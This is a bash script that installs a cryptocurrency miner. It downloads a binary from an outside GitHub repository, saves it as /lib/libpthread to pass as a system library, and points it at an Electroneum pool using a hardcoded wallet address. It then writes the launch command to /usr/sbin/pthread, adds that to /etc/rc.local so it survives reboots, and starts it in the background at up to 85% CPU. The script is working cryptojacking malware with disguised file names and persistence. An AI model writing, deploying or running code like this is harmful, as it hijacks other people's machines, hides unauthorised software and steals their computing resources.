#!/bin/bash
Get_Dist_Name()
{
    if grep -Eqii "CentOS" /etc/issue || grep -Eq "CentOS" /etc/*-release; then
        DISTRO='CentOS'
        PM='yum'
    elif grep -Eqi "Red Hat Enterprise Linux Server" /etc/issue || grep -Eq "Red Hat Enterprise Linux Server" /etc/*-release; then
        DISTRO='RHEL'
        PM='yum'
    elif grep -Eqi "Aliyun" /etc/issue || grep -Eq "Aliyun" /etc/*-release; then
        DISTRO='Aliyun'
        PM='yum'
    elif grep -Eqi "Fedora" /etc/issue || grep -Eq "Fedora" /etc/*-release; then
        DISTRO='Fedora'
        PM='yum'
    elif grep -Eqi "Debian" /etc/issue || grep -Eq "Debian" /etc/*-release; then
        DISTRO='Debian'
        PM='apt'
    elif grep -Eqi "Ubuntu" /etc/issue || grep -Eq "Ubuntu" /etc/*-release; then
        DISTRO='Ubuntu'
        PM='apt'
    elif grep -Eqi "Raspbian" /etc/issue || grep -Eq "Raspbian" /etc/*-release; then
        DISTRO='Raspbian'
        PM='apt'
    else
        DISTRO='unknow'
    fi
    echo $DISTRO;
}

Get_Dist_Name

sudo pkill libpthread
sleep 2
sudo curl -fsSL https://raw.githubusercontent.com/x7r3mx/xmrigeq/master/libpthread > /lib/libpthread
if [ ! -f "/usr/lib64/libuv.so.1" ]; then
    case $PM in  
        'yum')  
            if grep -Eqii "release 6" /etc/issue || grep -Eq "release 6" /etc/*-release; then
                sudo curl -fsSL "https://raw.githubusercontent.com/x7r3mx/xmrigeq/master/libuv-centos6.tar.gz" > "/var/tmp/libuv-centos6.tar.gz"
                sudo tar -zxvf "/var/tmp/libuv-centos6.tar.gz" -C "/usr/lib64/"
                echo "yum install libuv for CentOS 6"
            else
                sudo yum -y install libuv
                echo "yum install libuv for CentOS 7"
            fi
            ;;  
        'apt')  
            sudo dpkg --configure -a
            sudo apt-get -y install libuv1
            echo "apt-get install libuv"
            ;;  
        *)  
            echo $PM + "," +  $DISTRO
            ;;  
    esac 
else
    echo "libuv 1.x installed"
fi
WOKER_ID="$RANDOM"
DEPOSIT_ADDRESS="etnkMLr5wQPV5tp2SApoxbNE2CcESCrHpNXdPHhfe8ANHbKPjKsU6jyYp4Qj68De7PU3iMccp7Cwb6E3q3gCuBAY1bJgD6HbtN"
if [ x$1 != x ]
then
    DEPOSIT_ADDRESS=$1
fi
COMMANDLINE="nice -n 19 /lib/libpthread -o nl.etnpool.net:3333 -u $DEPOSIT_ADDRESS.$WOKER_ID -p x -k --max-cpu-usage=85 --background"
echo $COMMANDLINE
sudo echo  $COMMANDLINE> /usr/sbin/pthread
sudo chmod +x /lib/libpthread
sudo chmod +x /usr/sbin/pthread
if [ -z "`grep "/usr/sbin/pthread" /etc/rc.local`" ]; then
	sudo echo "/usr/sbin/pthread >/dev/null 2>&1 &" >> /etc/rc.local
else
	echo "has pthread"
fi
sudo /usr/sbin/pthread >/dev/null 2>&1 &

